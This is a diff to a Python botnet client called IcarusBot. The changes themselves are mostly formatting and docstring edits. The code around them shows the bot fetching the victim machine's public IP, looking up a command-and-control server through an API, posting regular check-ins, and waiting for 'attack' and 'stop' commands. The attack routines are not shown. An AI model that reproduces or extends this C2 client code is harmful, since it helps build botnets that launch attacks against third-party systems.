@@ -30,8 +30,8 @@ class IcarusBot:
             5. It will then call the main_loop(), which will sit and wait for a response from the C2 server for a command.
                 5.1: Refer to the main_loop() function for details about how it handles the protocol.
         """
-        #self.update_thread = threading.Timer(3.0, self.update)
-        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
+        # self.update_thread = threading.Timer(3.0, self.update)
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # UDP
         self.bot_id = BOT_ID_NAME  # should be random or grabbed somehow from victim computer
         self.ip = requests.get('https://api.ipify.org').content.decode('utf8')
         self.c2_server_details = ()
@@ -49,6 +49,7 @@ class IcarusBot:
         # Now we go and look for the C2 server.
         while True:
             nameserver_available = False
+            # This will loop until the nameserver has an answer.
             while not nameserver_available:
                 self.c2_server_details = tuple(requests.get(f'{API_URL}/api/lookup/c2').text.split("::"))
                 print(self.c2_server_details)
@@ -76,7 +77,8 @@ class IcarusBot:
         while True:
             time.sleep(2)
             # We don't care about the outcome.
-            r = requests.post(f'{API_URL}/api/lookup/bot/update', json={'id': self.bot_id, 'ip': self.ip, 'port': 25565})
+            r = requests.post(f'{API_URL}/api/lookup/bot/update',
+                              json={'id': self.bot_id, 'ip': self.ip, 'port': 25565})
 
     def main_loop(self):
         """
@@ -86,8 +88,9 @@ class IcarusBot:
                 1.2 If it's status, respond with the status
                 1.3 If it's attack, start the attack, respond with the status and details about the attack (type, ip, runtime)
                 1.4 If it's stop, stop the attack and respond with the new status
-            2. If it times out
+            2. If it times out (30 seconds)
                 2.1 disconnect with the webserver and ignore it.
+                2.2 Go back to asking the nameserver for a IP address for a C2 server.
         """
         parser = json.JSONDecoder()
         encoder = json.JSONEncoder()
@@ -142,6 +145,7 @@ class BotAction(Enum):
     IDLE = 'IDLE',
     ATTACKING = 'ATTACKING'
 
+
 def notification(action):
     """opens windows notification"""
     toast = ToastNotifier()
@@ -169,6 +173,7 @@ def main():
     bot = IcarusBot()
     bot.notification(True)
     bot.start()
+
 
 if __name__ == "__main__":
     main()
